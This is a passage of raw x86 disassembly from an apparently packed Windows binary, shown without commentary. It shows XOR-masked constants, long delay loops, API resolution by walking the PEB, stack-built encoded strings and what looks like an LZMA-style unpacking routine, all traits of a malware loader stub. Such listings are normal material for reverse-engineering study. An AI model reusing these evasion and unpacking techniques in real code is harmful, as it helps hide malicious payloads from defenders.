  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
  41d89f:	mov    eax,DWORD PTR [ebp-0x18]
  41d8a2:	xor    eax,ebx
  41d8a4:	mov    ecx,0xffcd8d1e
  41d8a9:	sub    ecx,eax
  41d8ab:	add    ecx,DWORD PTR [ebp-0x28]
  41d8ae:	mov    eax,DWORD PTR [ebp-0x8]
  41d8b1:	cmp    eax,ecx
  41d8b3:	ja     0x41da18
  41d8b9:	mov    DWORD PTR [ebp-0x20],0x0
  41d8c0:	push   DWORD PTR [ebp+0x8]
  41d8c3:	mov    edi,DWORD PTR [ebp+0x8]
  41d8c6:	mov    eax,DWORD PTR [ebp+0x8]
  41d8c9:	mov    edx,DWORD PTR [eax+0x1b4]
  41d8cf:	call   0x41fafc
  41d8d4:	push   eax
  41d8d5:	mov    eax,DWORD PTR [ebp+0x8]
  41d8d8:	mov    eax,DWORD PTR [eax+0x1a8]
  41d8de:	push   DWORD PTR [eax]
  41d8e0:	call   0x41f79d
  41d8e5:	mov    ecx,DWORD PTR [ebp+0x8]
  41d8e8:	mov    ecx,DWORD PTR [ecx+0x19c]
  41d8ee:	mov    DWORD PTR [ecx],eax
  41d8f0:	mov    eax,DWORD PTR [ebp+0x8]
  41d8f3:	mov    edi,DWORD PTR [eax+0x1d8]
  41d8f9:	mov    esi,DWORD PTR [ebp+0x8]
  41d8fc:	xor    eax,eax
  41d8fe:	lea    edx,[ebp-0x7c]
  41d901:	call   0x41fb32
  41d906:	push   eax
  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
